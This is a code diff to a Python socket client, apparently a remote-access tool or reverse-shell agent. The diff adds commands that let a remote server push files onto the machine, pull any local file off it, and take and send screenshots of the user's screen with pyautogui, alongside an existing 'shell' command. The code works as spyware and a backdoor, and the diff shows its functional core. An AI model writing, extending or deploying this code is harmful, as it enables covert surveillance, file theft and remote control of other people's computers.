@@ -2,6 +2,57 @@ import socket
 import ssl
 import subprocess
 import os
+import pyautogui
+
+
+def format_filename(commande):
+    file_path = commande.split(" ")[1]
+    if '/' in file_path:
+        return file_path.split("/")[-1], file_path
+    elif '\\' in file_path:
+        return file_path.split("\\")[-1], file_path
+    else:
+        return file_path, file_path
+
+
+def upload_feature(filename, conn):
+    print(f"Downloading {filename}...")
+
+    # Recevoir la taille du fichier (8 octets)
+    file_size = int.from_bytes(conn.recv(8), 'big')
+    print(f"Expected file size: {file_size} bytes")
+
+    # Recevoir le fichier en morceaux de 1024 octets
+    with open(filename, "wb") as file:
+        received = 0
+        while received < file_size:
+            chunk = conn.recv(min(1024, file_size - received))
+            if not chunk:
+                raise EOFError('Connection closed before receiving all the data')
+            file.write(chunk)
+            received += len(chunk)
+            # calculate progress
+            progress = str(round(((received / file_size) * 100)))
+            conn.send(progress.encode('utf-8'))
+
+    print("File uploaded successfully")
+    conn.send(b"File uploaded successfully")
+
+
+def download_feature(file_path, conn):
+    print(f"Uploading {file_path}...")
+    # Send the file size (8 bytes)
+    file_size = os.path.getsize(file_path)
+    conn.send(file_size.to_bytes(8, 'big'))
+    print(f"Sent file size: {file_size} bytes")
+
+    # Send the file in chunks of 1024 bytes
+    with open(file_path, "rb") as file:
+        while chunk := file.read(1024):
+            conn.send(chunk)
+
+    print("File uploaded successfully")
+    conn.send(b"File uploaded successfully")
 
 
 def connect_to_server():
@@ -21,37 +72,27 @@ def connect_to_server():
         if command.lower() == "close":
             break
 
+        # UPLOAD FILE command
         if command.lower().startswith("upload"):
             # format filename
-            file_path = command.split(" ")[1]
-            if '/' in file_path:
-                filename = file_path.split("/")[-1]
-            elif '\\' in file_path:
-                filename = file_path.split("\\")[-1]
-            else:
-                filename = file_path
+            filename, file_path = format_filename(command.lower())
 
-            print(f"Downloading {filename}...")
+            # send the command
+            upload_feature(filename, s)
 
-            # Recevoir la taille du fichier (8 octets)
-            file_size = int.from_bytes(s.recv(8), 'big')
-            print(f"Expected file size: {file_size} bytes")
+        # DONWLOAD FILE command
+        if command.lower().startswith("download"):
+            # format filename
+            filename, file_path = format_filename(command.lower())
 
-            # Recevoir le fichier en morceaux de 1024 octets
-            with open(filename, "wb") as file:
-                received = 0
-                while received < file_size:
-                    chunk = s.recv(min(1024, file_size - received))
-                    if not chunk:
-                        raise EOFError('Connection closed before receiving all the data')
-                    file.write(chunk)
-                    received += len(chunk)
-                    # calculate progress
-                    progress = str(round(((received / file_size) * 100)))
-                    s.send(progress.encode('utf-8'))
+            # send the command
+            download_feature(file_path, s)
 
-            print("File uploaded successfully")
-            s.send(b"File uploaded successfully")
+        if command.lower() == "screenshot":
+            print("Taking screenshot...")
+            screenshot = pyautogui.screenshot()
+            screenshot.save("screenshot.png")
+            download_feature("screenshot.png", s)
 
         if command.lower() == "shell":
             print("Shell opened")
